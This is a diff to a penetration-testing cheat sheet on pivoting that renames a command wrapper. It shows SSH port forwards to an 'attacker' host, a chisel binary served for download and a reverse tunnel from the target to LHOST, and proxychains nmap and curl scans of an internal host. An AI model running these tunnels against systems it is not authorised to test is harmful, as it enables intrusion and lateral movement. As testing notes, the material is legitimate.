@@ -6,9 +6,9 @@ Reach services bound to `127.0.0.1` on the target, or hosts behind it.
 
 ```bash
 # local forward: target's 127.0.0.1:8080 becomes your 8080
-htb x "ssh -i key -L 8080:127.0.0.1:8080 user@$T -N -f"
+pwnloop x "ssh -i key -L 8080:127.0.0.1:8080 user@$T -N -f"
 # dynamic SOCKS proxy — everything through the target
-htb x "ssh -i key -D 1080 user@$T -N -f"
+pwnloop x "ssh -i key -D 1080 user@$T -N -f"
 # remote forward: expose your listener to a target that cannot reach you directly
 ssh -R 4444:127.0.0.1:4444 user@attacker
 ```
@@ -17,8 +17,8 @@ ssh -R 4444:127.0.0.1:4444 user@attacker
 
 ```bash
 # attacker
-htb x "cp /opt/static/chisel_* /engagements/$NAME/www/ && cd /engagements/$NAME/www && python3 -m http.server 8000" &
-htb x "/opt/static/chisel_1.10.1_linux_arm64 server -p 9000 --reverse" &
+pwnloop x "cp /opt/static/chisel_* /engagements/$NAME/www/ && cd /engagements/$NAME/www && python3 -m http.server 8000" &
+pwnloop x "/opt/static/chisel_1.10.1_linux_arm64 server -p 9000 --reverse" &
 # target
 ./chisel client LHOST:9000 R:socks          # SOCKS5 on attacker:1080
 ./chisel client LHOST:9000 R:8080:127.0.0.1:8080   # single port
@@ -27,8 +27,8 @@ htb x "/opt/static/chisel_1.10.1_linux_arm64 server -p 9000 --reverse" &
 ## Using the proxy
 
 ```bash
-htb x "proxychains4 -q nmap -sT -Pn -n 10.10.20.5"
-htb x "proxychains4 -q curl http://10.10.20.5"
+pwnloop x "proxychains4 -q nmap -sT -Pn -n 10.10.20.5"
+pwnloop x "proxychains4 -q curl http://10.10.20.5"
 ```
 `/etc/proxychains4.conf` — set `socks5 127.0.0.1 1080`. Note that only TCP
 connect scans work through a SOCKS proxy; `-sS` and UDP do not.
